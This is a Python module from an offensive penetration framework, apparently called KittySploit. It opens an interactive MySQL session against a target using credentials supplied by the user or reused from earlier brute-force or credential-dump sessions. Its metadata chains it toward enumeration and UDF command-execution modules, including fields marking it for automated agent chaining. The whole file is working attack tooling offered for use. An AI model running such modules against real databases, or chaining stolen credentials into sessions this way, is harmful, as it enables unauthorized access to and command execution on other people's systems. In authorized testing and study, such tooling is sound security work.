#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Open a MySQL BIND framework session using known credentials.

Chains after auxiliary/scanner/mysql/mysql_login_bruteforce or any cred dump:
set target/username/password, or set session_id to reuse an existing MySQL session.
"""

from __future__ import annotations

from typing import Any, Dict, Optional, Tuple

from kittysploit import *
from core.framework.base_module import ModuleResult
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client
from lib.c2.bind_listener_launcher import launch_bind_listener

MYSQL_LISTENER = "listeners/database/mysql"
PAYLOAD_PATH = "payloads/singles/cmd/multi/mysql_bind_session"


class Module(Auxiliary, Tcp_scanner_client):
    __info__ = {
        "name": "MySQL BIND session launcher",
        "description": (
            "Connect the framework MySQL BIND listener with supplied or session-stored "
            "credentials and register an interactive MySQL session."
        ),
        "author": "KittySploit Team",
        "tags": ["mysql", "database", "bind", "chain"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe"],
            "produces": ["authenticated_session"],
            "chain": {
                "consumes_capabilities": ["db_access", "credentials"],
                "produces_capabilities": ["authenticated_session", "db_access"],
                "option_bindings": {
                    "target": "target",
                    "port": "port",
                    "username": "username",
                    "password": "password",
                    "database": "database",
                },
                "suggested_followups": [
                    "post/mysql/gather/enum_databases",
                    "post/mysql/gather/enum_users",
                    "post/mysql/privileges/check_privileges",
                    "post/mysql/exploits/udf_command_exec",
                ],
            },
        },
    }

    port = OptPort(3306, "MySQL port", True)
    username = OptString("", "MySQL username (required unless session_id set)", False)
    password = OptString("", "MySQL password", False)
    database = OptString("", "Default database (optional)", False)
    session_id = OptString("", "Reuse credentials from an existing MySQL session", False)
    use_latest_mysql_session = OptBool(
        True,
        "When username empty, reuse latest MySQL session for target host",
        False,
    )
    set_framework_payload = OptBool(
        True,
        "Set current module payload hint to mysql_bind_session",
        False,
        advanced=True,
    )

    def _opt(self, name: str, default: Any = "") -> Any:
        val = getattr(self, name, default)
        return getattr(val, "value", val) if hasattr(val, "value") else val

    def _session_data(self, sid: str) -> Optional[dict]:
        if not self.framework or not hasattr(self.framework, "session_manager"):
            return None
        session = self.framework.session_manager.get_session(str(sid).strip())
        if not session:
            return None
        data = getattr(session, "data", None) or {}
        return data if isinstance(data, dict) else None

    def _find_latest_mysql_session(self, host: str) -> Optional[Tuple[str, dict]]:
        if not self.framework or not hasattr(self.framework, "session_manager"):
            return None
        sm = self.framework.session_manager
        sessions = getattr(sm, "sessions", {}) or {}
        host = str(host or "").strip()
        matches = []
        for sid, sess in sessions.items():
            st = str(getattr(sess, "session_type", "") or "").lower()
            if st != SessionType.MYSQL.value:
                continue
            data = getattr(sess, "data", None) or {}
            if not isinstance(data, dict):
                continue
            sh = str(data.get("host") or getattr(sess, "host", "") or "").strip()
            if host and sh and sh != host:
                continue
            matches.append((str(sid), data))
        if not matches:
            return None
        return matches[-1]

    def _resolve_credentials(self) -> Optional[Dict[str, Any]]:
        host = self._host()
        port = int(self._port())
        user = str(self._opt("username", "") or "").strip()
        pwd = str(self._opt("password", "") or "")
        db = str(self._opt("database", "") or "").strip()

        sid = str(self._opt("session_id", "") or "").strip()
        if sid:
            data = self._session_data(sid)
            if not data:
                print_error(f"Session not found: {sid}")
                return None
            host = str(data.get("host") or host or "").strip()
            port = int(data.get("port") or port or 3306)
            user = str(data.get("username") or user or "").strip()
            pwd = str(data.get("password") if data.get("password") is not None else pwd)
            db = str(data.get("database") or db or "").strip()
        elif not user and bool(self._opt("use_latest_mysql_session", True)):
            found = self._find_latest_mysql_session(host)
            if found:
                sid, data = found
                print_info(f"Reusing credentials from MySQL session {sid}")
                host = str(data.get("host") or host or "").strip()
                port = int(data.get("port") or port or 3306)
                user = str(data.get("username") or "").strip()
                pwd = str(data.get("password") if data.get("password") is not None else "")
                db = str(data.get("database") or db or "").strip()

        if not host:
            print_error("Target host required (set target or session_id)")
            return None
        if not user:
            print_error("Username required (set username, session_id, or run after mysql_login_bruteforce)")
            return None

        return {
            "host": host,
            "port": port,
            "username": user,
            "password": pwd,
            "database": db,
        }

    def _apply_framework_payload_hint(self, creds: Dict[str, Any]) -> None:
        if not bool(self._opt("set_framework_payload", True)):
            return
        mod = getattr(self.framework, "current_module", None)
        if not mod or not hasattr(mod, "payload"):
            return
        try:
            mod.payload = PAYLOAD_PATH
            for opt_name, key in (
                ("rhost", "host"),
                ("rport", "port"),
                ("username", "username"),
                ("password", "password"),
                ("database", "database"),
            ):
                if hasattr(mod, opt_name) and key in creds:
                    opt = getattr(mod, opt_name)
                    if hasattr(opt, "__set__"):
                        opt.__set__(mod, creds[key])
        except Exception as exc:
            print_warning(f"Could not set framework payload hint: {exc}")

    def check(self):
        creds = self._resolve_credentials()
        if not creds:
            return {"vulnerable": False, "reason": "credentials not resolved", "confidence": "low"}
        return {
            "vulnerable": True,
            "reason": f"MySQL BIND ready for {creds['username']}@{creds['host']}:{creds['port']}",
            "confidence": "high",
        }

    def run(self):
        creds = self._resolve_credentials()
        if not creds:
            return False

        self._apply_framework_payload_hint(creds)
        print_status(
            f"Opening MySQL BIND session to {creds['host']}:{creds['port']} "
            f"as {creds['username']}..."
        )

        session_id = launch_bind_listener(
            self.framework,
            MYSQL_LISTENER,
            {
                "host": creds["host"],
                "port": creds["port"],
                "username": creds["username"],
                "password": creds["password"],
                "database": creds.get("database") or "",
            },
        )

        if not session_id:
            print_error("MySQL BIND session could not be opened")
            return False

        print_success(f"MySQL BIND session ready: {session_id}")
        print_info(f"Payload pairing: {PAYLOAD_PATH}")
        print_info(f"Use: sessions -i {session_id}")
        return ModuleResult(success=True, session_id=session_id, data=creds)
